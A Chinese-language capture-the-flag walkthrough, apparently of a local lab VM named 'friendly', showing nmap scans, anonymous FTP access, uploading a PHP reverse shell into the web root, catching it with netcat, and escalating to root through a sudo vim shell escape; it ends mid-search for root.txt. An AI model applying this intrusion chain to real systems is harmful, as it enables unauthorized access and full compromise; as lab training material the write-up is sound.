# 信息搜集

主机发现

```
┌──(kali㉿kali)-[~]
└─$ nmap -sn 192.168.21.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-17 23:02 EDT
Nmap scan report for 192.168.21.8
Host is up (0.00017s latency).
MAC Address: 08:00:27:A2:9F:C0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.21.10
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 3.08 seconds
```

端口扫描

```
┌──(kali㉿kali)-[~]
└─$ nmap --min-rate 10000 -p- 192.168.21.8 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-17 23:03 EDT
Nmap scan report for 192.168.21.8
Host is up (0.00033s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http
MAC Address: 08:00:27:A2:9F:C0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.75 seconds
                                                                
┌──(kali㉿kali)-[~]
└─$ nmap -sU --min-rate 10000 -p- 192.168.21.8
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-17 23:05 EDT
Warning: 192.168.21.8 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.21.8
Host is up (0.0016s latency).
All 65535 scanned ports on 192.168.21.8 are in ignored states.
Not shown: 65457 open|filtered udp ports (no-response), 78 closed udp ports (port-unreach)
MAC Address: 08:00:27:A2:9F:C0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 73.07 seconds
                                                                
┌──(kali㉿kali)-[~]
└─$ nmap -sS -sV -O -p21,80 192.168.21.8      
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-17 23:06 EDT
Nmap scan report for 192.168.21.8
Host is up (0.00030s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
MAC Address: 08:00:27:A2:9F:C0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.79 seconds
```

# 漏洞利用

21端口可以匿名登陆，但是没发现有东西

```
┌──(kali㉿kali)-[~]
└─$ ftp 192.168.21.8
Connected to 192.168.21.8.
220 ProFTPD Server (friendly) [::ffff:192.168.21.8]
Name (192.168.21.8:kali): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: 
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||8709|)
150 Opening ASCII mode data connection for file list
drwxrwxrwx   2 root     root         4096 Mar 11  2023 .
drwxrwxrwx   2 root     root         4096 Mar 11  2023 ..
-rw-r--r--   1 root     root        10725 Feb 23  2023 index.html
226 Transfer complete
```

目录扫描也什么也没发现

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.21.8 -w SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -x html,php,txt,jpg,png,zip,git
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.21.8
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,jpg,png,zip,git,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 277]
/index.html           (Status: 200) [Size: 10725]
/.php                 (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
/logitech-quickcam_w0qqcatrefzc5qqfbdz1qqfclz3qqfposz95112qqfromzr14qqfrppz50qqfsclz1qqfsooz1qqfsopz1qqfssz0qqfstypez1qqftrtz1qqftrvz1qqftsz2qqnojsprzyqqpfidz0qqsaatcz1qqsacatzq2d1qqsacqyopzgeqqsacurz0qqsadisz200qqsaslopz1qqsofocuszbsqqsorefinesearchz1.html (Status: 403) [Size: 277]
Progress: 9482032 / 9482040 (100.00%)
===============================================================
Finished
===============================================================
```

还是看一下21端口里的那个index.html

<img width="549" height="274" alt="图片" src="https://github.com/user-attachments/assets/8e9f17bb-e9a1-4d3f-9799-f4be03ce8722" />

发现是主页，通过ftp上传一个反弹shell

```
ftp> put 1.php
local: 1.php remote: 1.php
229 Entering Extended Passive Mode (|||8519|)
150 Opening BINARY mode data connection for 1.php
100% |*******************|  2589       27.74 MiB/s    00:00 ETA
226 Transfer complete
2589 bytes sent in 00:00 (4.62 MiB/s)
ftp> ls -la
229 Entering Extended Passive Mode (|||18696|)
150 Opening ASCII mode data connection for file list
drwxrwxrwx   2 root     root         4096 Aug 18 03:36 .
drwxrwxrwx   2 root     root         4096 Aug 18 03:36 ..
-rw-r--r--   1 ftp      nogroup      2589 Aug 18 03:36 1.php
-rw-r--r--   1 root     root        10725 Feb 23  2023 index.html
226 Transfer complete
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.21.10] from (UNKNOWN) [192.168.21.8] 36092
Linux friendly 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64 GNU/Linux
 23:36:51 up 35 min,  0 users,  load average: 0.00, 0.53, 2.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
dash: 0: can't access tty; job control turned off
$
```

# 权限提升

```
$ sudo -l
Matching Defaults entries for www-data on friendly:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on friendly:
    (ALL : ALL) NOPASSWD: /usr/bin/vim
$ sudo vim -c ':!/bin/sh'
:!/bin/sh
id
uid=0(root) gid=0(root) groups=0(root)
ls -la
total 44
drwx------  3 root root  4096 Aug 17 23:46 .
drwxr-xr-x 18 root root  4096 Mar 11  2023 ..
lrwxrwxrwx  1 root root     9 Feb 23  2023 .bash_history -> /dev/null
-rw-r--r--  1 root root   571 Apr 10  2021 .bashrc
drwxr-xr-x  3 root root  4096 Feb 21  2023 .local
-rw-r--r--  1 root root   161 Jul  9  2019 .profile
-rw-------  1 root root 12288 Aug 17 23:44 .root.txt.swp
-rw-------  1 root root  1145 Aug 17 23:46 .viminfo
-r-xr-xr-x  1 root root   509 Mar 11  2023 interfaces.sh
-r--------  1 root root    24 Mar 11  2023 root.txt
cat root.txt
Not yet! Find root.txt.
find / -name root.txt 2>/dev/null
/var/log/apache2/root.txt
/root/root.txt
cat /var/log/apache2/root.txt
```
